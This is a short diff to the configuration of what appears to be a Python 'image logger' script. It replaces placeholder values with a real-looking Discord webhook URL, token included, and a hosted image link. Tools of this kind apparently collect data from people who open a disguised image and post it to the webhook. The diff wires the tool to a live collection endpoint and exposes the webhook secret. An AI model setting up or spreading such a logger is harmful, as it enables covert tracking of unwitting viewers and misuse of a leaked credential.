@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1353383806098210866/_wVkYp4tSZeUGU1AxiTqzmyKmsrsrNbAsmqoSi4ee4TCSu4aSQHWXBIkI39MEIgdgW7T",
+    "image": "https://th.bing.com/th/id/OIP.Olhp34v4o6Jebqxt4_7e3AHaEK?w=305&h=180&c=7&r=0&o=5&pid=1.7", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
